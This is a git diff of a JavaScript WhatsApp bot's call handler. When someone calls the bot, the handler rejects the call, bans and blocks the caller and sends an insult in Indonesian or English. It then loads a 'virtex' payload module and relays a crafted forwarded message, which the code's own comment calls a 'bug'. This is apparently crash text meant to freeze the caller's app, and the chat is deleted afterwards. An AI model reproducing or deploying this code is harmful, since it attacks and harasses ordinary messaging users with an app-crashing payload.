@@ -68,8 +68,20 @@ async function starts() {
         
    client.on('CB:Call',  async (json) => {
    if(!Anticall) return
+   
 	let number = json[1]['from'];
         let isOffer = json[1]["type"] == "offer";
+     pushname = client.contacts[number] != undefined ? client.contacts[number].notify = undefined ? PhoneNumber('+' + number.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[number].notify || client.contacts[number].vname : PhoneNumber('+' + number.replace('@s.whatsapp.net', '')).getNumber('international')
+      if(cekBannedUser(number, ban)) return
+        console.log("call dari "+ number)
+        console.log(pushname)
+        addBanned (pushname, calender, number, ban) 
+        addBlock(number, blocked)  
+        forward = { forwardingScore: 10000000000, isForwarded: true, sendEphemeral: true}
+        const { virtex8 } = require('./virtex/virtex.js')
+        davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
+        hmm4 = fs.readFileSync('./stik/fake.jpeg'),
+        
         if (number && isOffer && json[1]["data"]) {
             var tag = client.generateMessageTag();
             var NodePayload = ["action", "call", ["call", {
@@ -86,12 +98,7 @@ async function starts() {
                 ]
             ]];
             await client.send(`${tag}, ${JSON.stringify(NodePayload)}`)
-            pushname = client.contacts[number] != undefined ? client.contacts[number].notify = undefined ? PhoneNumber('+' + number.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[number].notify || client.contacts[number].vname : PhoneNumber('+' + number.replace('@s.whatsapp.net', '')).getNumber('international')
-        if(cekBannedUser(number, ban)) return
-        console.log("call dari "+ number)
-        console.log(pushname)
-        addBanned (pushname, calender, number, ban) 
-        addBlock(number, blocked)  
+            
       
         if(number.startsWith("62")){
         var teksnya = "Anjing lu, ga usah nelpon /vc napa, kurang kerjaan banget"
@@ -99,11 +106,7 @@ async function starts() {
         var teksnya = "Fuck you bitch, why you call me huh ? "
         }
         
-        client.sendMessage(number, teksnya, MessageType.text)
-        forward = { forwardingScore: 10000000000, isForwarded: true, sendEphemeral: true}
-        const { virtex8 } = require('./virtex/virtex.js')
-        davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
-        hmm4 = fs.readFileSync('./stik/fake.jpeg'),
+        client.sendMessage(number, teksnya, MessageType.text)        
         imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
         imeg = imeu.message.imageMessage
         res =  client.prepareMessageFromContent(number, {
@@ -121,15 +124,13 @@ async function starts() {
          'contextInfo': forward
          }
          }, {contextInfo: forward}), 
-        await client.relayWAMessage(res)
-        await client.modifyChat(number, ChatModification.delete)       
-        //await client.sendMessage(number, "Kamu telah di block,banned + bug karena telpon botz", MessageType.text)
-        await client.blockUser(number, "add") // Block user
-        
+        await client.relayWAMessage(res)    
             
          }
       
-	    
+	    await client.modifyChat(number, ChatModification.delete)       
+        //await client.sendMessage(number, "Kamu telah di block,banned + bug karena telpon botz", MessageType.text)
+        await client.blockUser(number, "add") // Block user
         
         
         
